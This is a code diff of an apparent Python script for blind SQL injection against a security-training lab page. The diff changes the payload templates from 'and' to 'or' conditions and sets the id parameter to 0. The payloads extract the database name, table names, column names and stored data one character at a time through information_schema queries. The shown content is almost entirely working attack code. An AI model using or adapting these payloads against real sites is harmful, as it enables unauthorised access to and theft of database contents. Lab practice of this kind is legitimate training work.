@@ -7,14 +7,14 @@ start_time = time.time()
 session = HTMLSession()
 proxies = {}
 
-url = 'http://inject2.lab.aqlab.cn:81/Pass-11/index.php?id=1"'
+url = 'http://inject2.lab.aqlab.cn:81/Pass-11/index.php?id=0"'
 flag_success = '有数据'
 
-payload1_database_length = ' and length(database())={}%23'
-payload_database         = ' and ord(substr(database(),{},1))>{}%23'
-payload_table            = ' and ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}%23'
-payload_column           = ' and ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}%23'
-payload_data             = ' and ord( SUBSTR((select group_concat({column_name}) from {table_name}),{},1))>{}%23'
+payload1_database_length = ' or length(database())={}%23'
+payload_database         = ' or ord(substr(database(),{},1))>{}%23'
+payload_table            = ' or ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))>{}%23'
+payload_column           = ' or ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}%23'
+payload_data             = ' or ord( SUBSTR((select group_concat({column_name}) from {table_name}),{},1))>{}%23'
 
 
 def database_length():
